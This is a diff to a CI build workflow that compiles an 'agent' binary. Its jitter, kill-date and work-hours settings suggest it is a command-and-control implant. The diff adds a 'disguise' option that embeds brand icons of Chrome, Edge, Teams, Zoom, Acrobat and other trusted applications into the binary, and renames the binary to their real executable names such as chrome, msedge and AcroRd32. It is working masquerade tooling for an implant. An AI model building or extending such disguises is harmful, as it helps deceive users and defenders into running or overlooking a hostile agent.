@@ -60,6 +60,11 @@ on:
         description: 'Build ID for tracking'
         required: true
         type: string
+      disguise:
+        description: 'App disguise profile (none, chrome, edge, teams, etc.)'
+        required: false
+        default: 'none'
+        type: string
 
 jobs:
   build:
@@ -91,6 +96,55 @@ jobs:
             echo "ext=" >> $GITHUB_OUTPUT
           fi
 
+      - name: Download disguise icon
+        if: inputs.disguise != 'none' && inputs.target_os == 'windows'
+        shell: bash
+        working-directory: agent
+        run: |
+          # Map disguise ID to simpleicons slug and brand color
+          case "${{ inputs.disguise }}" in
+            adobe_acrobat) ICON_SLUG="adobeacrobatreader" COLOR="EC1C24" ;;
+            chrome) ICON_SLUG="googlechrome" COLOR="4285F4" ;;
+            edge) ICON_SLUG="microsoftedge" COLOR="0078D7" ;;
+            teams) ICON_SLUG="microsoftteams" COLOR="6264A7" ;;
+            zoom) ICON_SLUG="zoom" COLOR="0B5CFF" ;;
+            slack) ICON_SLUG="slack" COLOR="4A154B" ;;
+            discord) ICON_SLUG="discord" COLOR="5865F2" ;;
+            spotify) ICON_SLUG="spotify" COLOR="1DB954" ;;
+            steam) ICON_SLUG="steam" COLOR="000000" ;;
+            vlc) ICON_SLUG="vlcmediaplayer" COLOR="FF8800" ;;
+            sevenzip) ICON_SLUG="7zip" COLOR="000000" ;;
+            notepadpp) ICON_SLUG="notepadplusplus" COLOR="90E59A" ;;
+            filezilla) ICON_SLUG="filezilla" COLOR="BF0000" ;;
+            onedrive) ICON_SLUG="microsoftonedrive" COLOR="0078D4" ;;
+            dropbox) ICON_SLUG="dropbox" COLOR="0061FF" ;;
+            nodejs) ICON_SLUG="nodedotjs" COLOR="339933" ;;
+            python) ICON_SLUG="python" COLOR="3776AB" ;;
+            vscode) ICON_SLUG="visualstudiocode" COLOR="007ACC" ;;
+            *) ICON_SLUG="" ;;
+          esac
+
+          if [ -n "$ICON_SLUG" ]; then
+            # Download SVG from simpleicons CDN
+            curl -sL -o app_icon.svg "https://cdn.simpleicons.org/${ICON_SLUG}/${COLOR}" || true
+
+            # Convert SVG to ICO - magick is available on windows-latest runner
+            if [ -f app_icon.svg ] && [ -s app_icon.svg ]; then
+              magick app_icon.svg -background none -resize 256x256 app_icon.ico 2>/dev/null || \
+              convert app_icon.svg -background none -resize 256x256 app_icon.ico 2>/dev/null || true
+            fi
+
+            if [ -f app_icon.ico ] && [ -s app_icon.ico ]; then
+              ICON_ABS="$(cd "$(dirname app_icon.ico)" && pwd)/app_icon.ico"
+              echo "SG_ICON_PATH=${ICON_ABS}" >> $GITHUB_ENV
+              echo "Icon downloaded and converted: ${ICON_ABS}"
+            else
+              echo "Icon conversion failed or empty - building without icon"
+            fi
+          else
+            echo "No icon slug for disguise '${{ inputs.disguise }}' - skipping icon"
+          fi
+
       - name: Build agent
         working-directory: agent
         shell: bash
@@ -101,6 +155,7 @@ jobs:
           SG_JITTER: ${{ inputs.jitter_percent }}
           SG_KILLDATE: ${{ inputs.kill_date }}
           SG_WORK_HOURS: ${{ inputs.work_hours }}
+          SG_DISGUISE: ${{ inputs.disguise }}
         run: |
           FEATURES="${{ inputs.modules }}"
           cargo build --release --target ${{ steps.target.outputs.triple }} --no-default-features --features "$FEATURES"
@@ -109,7 +164,33 @@ jobs:
         shell: bash
         run: |
           SRC="agent/target/${{ steps.target.outputs.triple }}/release/agent${{ steps.target.outputs.ext }}"
-          DST="agent-${{ inputs.build_id }}${{ steps.target.outputs.ext }}"
+
+          # Use disguise-matched filename if set, otherwise default
+          case "${{ inputs.disguise }}" in
+            adobe_acrobat) FNAME="AcroRd32" ;;
+            chrome) FNAME="chrome" ;;
+            edge) FNAME="msedge" ;;
+            teams) FNAME="Teams" ;;
+            zoom) FNAME="Zoom" ;;
+            slack) FNAME="slack" ;;
+            discord) FNAME="Discord" ;;
+            spotify) FNAME="Spotify" ;;
+            steam) FNAME="steam" ;;
+            vlc) FNAME="vlc" ;;
+            sevenzip) FNAME="7zFM" ;;
+            notepadpp) FNAME="notepad++" ;;
+            winrar) FNAME="WinRAR" ;;
+            filezilla) FNAME="filezilla" ;;
+            putty) FNAME="putty" ;;
+            onedrive) FNAME="OneDrive" ;;
+            dropbox) FNAME="Dropbox" ;;
+            nodejs) FNAME="node" ;;
+            python) FNAME="python" ;;
+            vscode) FNAME="Code" ;;
+            *) FNAME="agent-${{ inputs.build_id }}" ;;
+          esac
+
+          DST="${FNAME}${{ steps.target.outputs.ext }}"
           cp "$SRC" "$DST"
           echo "BINARY=$DST" >> $GITHUB_ENV
 
